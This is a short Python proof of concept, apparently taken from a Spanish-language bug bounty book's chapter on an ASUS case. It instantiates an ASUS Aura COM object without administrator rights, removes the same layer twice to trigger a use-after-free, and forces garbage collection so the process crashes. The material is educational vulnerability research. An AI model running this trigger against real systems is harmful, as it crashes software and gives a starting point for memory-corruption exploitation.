# Extraído de: LibroBugBounty/cap-22-caso-asus.md
import win32com.client
import gc

CLSID_AURA = "{756E6C18-79CC-3842-9E47-7C80011D303A}"

# Instanciar sin privilegios de admin
anim = win32com.client.Dispatch(CLSID_AURA)
anim.init(10, 10)

# Crear y anadir un layer
layer = anim.CreateLayer()
anim.AddLayer(layer)

# Primera remocion: valida
anim.RemoveLayer(layer)

# Segunda remocion: USE-AFTER-FREE
anim.RemoveLayer(layer)  # No lanza excepcion!
# Opera sobre memoria ya liberada

# Trigger del crash via GC
del layer
del anim
gc.collect()
# NullReferenceException en AuraLayer.Finalize()
# Proceso termina con exit code 139 (SEGFAULT)
